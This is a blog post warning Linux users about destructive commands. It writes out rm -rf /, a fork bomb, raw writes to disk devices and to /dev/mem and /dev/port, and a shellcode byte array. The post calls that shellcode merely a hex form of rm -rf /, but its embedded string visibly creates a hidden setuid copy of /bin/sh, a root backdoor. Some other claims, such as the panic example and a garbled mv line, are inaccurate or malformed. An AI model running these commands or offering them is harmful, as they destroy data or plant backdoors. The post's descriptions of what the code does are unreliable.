---
layout: post
title: "The Linux commands you should NEVER use"
date: 2018-01-04 12:00:00 -0500
categories: linux
tags: linux ubuntu
image:
  path: /assets/img/headers/command-linux/1.png
---

Hello everyone! Today, we're going to discuss some commands that should never be used on Linux distributions, as they can cause serious problems. Let's take a look at a few of them:

CAUTION: Never use these commands:

1) The following command clears everything in the system, absolutely everything. It is extremely destructive and should be avoided at all costs. 
```sh
rm -rf /
```
This code is the hexadecimal representation of `rm -rf /`. Executing this code will have the same effect as the previous command, deleting everything on your system.
```c
char esp[] __attribute__ ((section(".text"))) = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
"cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;";
```
2) BASH FORK BOMB: This command creates a fork bomb, which is a process that replicates itself indefinitely and consumes system resources until it crashes. It can cause a system to become unresponsive or even crash.
```sh
:(){ :|: & };:
```
3) OVERWRITING THE HARD DRIVE WITH GARBAGE: The command `Any command > /dev/hda` overwrites data on your storage device. Any command with output can be used in place of "Any command." For example:
```sh
ls -la > /dev/hda
```
4) This command writes the directory listing to your main storage device, effectively overwriting all the data on your drive. It can lead to data loss and panic.

   - These commands, `mv / /dev/null or mv /dev/null`, attempt to move the entire system or root directory to the null device. This effectively destroys the system and renders it unusable.
   - FORMATTING THE WRONG DRIVE: When formatting a drive, use caution, as the command mkfs.ext3 `/dev/hda` formats the entire HDD/SSD, erasing all data on it. Be extremely careful when formatting partitions from the command line.
   - Kernel panics: Some Linux commands can cause the kernel to panic, resulting in system crashes. Here are a few examples:

```bash
dd if=/dev/random of=/dev/port
echo 1 > /proc/sys/kernel/panic
cat /dev/port
cat /dev/zero > /dev/mem
```
These commands can cause system instability and should not be executed without proper understanding and precautions.

Always exercise caution when executing commands on your Linux system. It's crucial to understand the potential consequences and only use trusted and verified scripts or commands. Avoid downloading and running scripts if you're unsure about their functionality.

Stay safe and make informed decisions when working with your Linux system!
